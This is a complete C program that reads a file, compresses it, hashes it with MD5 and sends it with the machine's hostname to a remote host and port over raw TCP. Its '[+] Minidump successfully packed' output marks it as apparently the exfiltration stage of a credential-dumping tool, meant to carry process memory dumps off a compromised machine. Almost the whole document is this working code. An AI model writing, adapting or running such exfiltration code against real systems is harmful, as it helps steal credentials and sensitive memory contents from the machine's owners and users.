#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <zlib.h>
#include <openssl/md5.h>
#include <time.h>

#define CHUNK 16384

unsigned char* compress_data(const unsigned char* data, size_t data_len, size_t* compressed_len) {
    z_stream strm;
    unsigned char *compressed_data;
    size_t buffer_size = compressBound(data_len);
    compressed_data = (unsigned char*)malloc(buffer_size);
    if (!compressed_data) return NULL;

    strm.zalloc = Z_NULL;
    strm.zfree = Z_NULL;
    strm.opaque = Z_NULL;
    if (deflateInit(&strm, Z_BEST_COMPRESSION) != Z_OK) {
        free(compressed_data);
        return NULL;
    }

    strm.next_in = (Bytef*)data;
    strm.avail_in = data_len;
    strm.next_out = compressed_data;
    strm.avail_out = buffer_size;

    if (deflate(&strm, Z_FINISH) != Z_STREAM_END) {
        deflateEnd(&strm);
        free(compressed_data);
        return NULL;
    }
    *compressed_len = strm.total_out;

    deflateEnd(&strm);
    return compressed_data;
}

char* calculate_md5(const unsigned char* data, size_t data_len) {
    MD5_CTX mdContext;
    unsigned char md5_digest[MD5_DIGEST_LENGTH];
    char *md5_string = malloc(MD5_DIGEST_LENGTH * 2 + 1);
    if (!md5_string) return NULL;

    MD5_Init(&mdContext);
    MD5_Update(&mdContext, data, data_len);
    MD5_Final(md5_digest, &mdContext);

    for (int i = 0; i < MD5_DIGEST_LENGTH; i++) {
        sprintf(&md5_string[i * 2], "%02x", md5_digest[i]);
    }
    md5_string[MD5_DIGEST_LENGTH * 2] = '\0';
    return md5_string;
}

void send_zip(const char *host, int port, const unsigned char *data, size_t data_len) {
    unsigned char *compressed_bytes = NULL;
    size_t compressed_len;

    compressed_bytes = compress_data(data, data_len, &compressed_len);
    if (!compressed_bytes) {
        perror("Compression failed");
        return;
    }

    printf("[+] Minidump successfully packed, size %.2f MB\n", (double)compressed_len / 1024.0 / 1024.0);

    char *zip_hash = calculate_md5(compressed_bytes, compressed_len);
    if (zip_hash) {
        printf("[*] MD5: %s\n", zip_hash);
        free(zip_hash);
    } else {
        perror("MD5 calculation failed");
    }


    int sock = 0;
    struct sockaddr_in serv_addr;

    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        perror("Socket creation error");
        free(compressed_bytes);
        return;
    }

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(port);

    if (inet_pton(AF_INET, host, &serv_addr.sin_addr) <= 0) {
        perror("Invalid address/ Address not supported");
        close(sock);
        free(compressed_bytes);
        return;
    }

    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        perror("Connection failed");
        close(sock);
        free(compressed_bytes);
        return;
    }

    char hostname[256];
    if (gethostname(hostname, sizeof(hostname)) != 0) {
        strcpy(hostname, "unknown");
    }
    char header[512];
    snprintf(header, sizeof(header), "%s|%zu", hostname, compressed_len);

    if (send(sock, header, strlen(header), 0) != strlen(header)) {
        perror("Header send failed");
        close(sock);
        free(compressed_bytes);
        return;
    }

    if (send(sock, compressed_bytes, compressed_len, 0) != compressed_len) {
        perror("Data send failed");
        close(sock);
        free(compressed_bytes);
        return;
    }

    close(sock);
    free(compressed_bytes);
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        fprintf(stderr, "Usage: %s <host> <port> <file_path>\n", argv[0]);
        return 1;
    }

    const char *host = argv[1];
    int port = atoi(argv[2]);
    const char *file_path = argv[3];

    FILE *file = fopen(file_path, "rb");
    if (!file) {
        perror("Error opening file");
        return 1;
    }

    fseek(file, 0, SEEK_END);
    size_t file_size = ftell(file);
    fseek(file, 0, SEEK_SET);

    unsigned char *data = (unsigned char*)malloc(file_size);
    if (!data) {
        perror("Memory allocation failed");
        fclose(file);
        return 1;
    }

    if (fread(data, 1, file_size, file) != file_size) {
        perror("Error reading file");
        fclose(file);
        free(data);
        return 1;
    }
    fclose(file);
    send_zip(host, port, data, file_size);
    free(data);
    return 0;
}

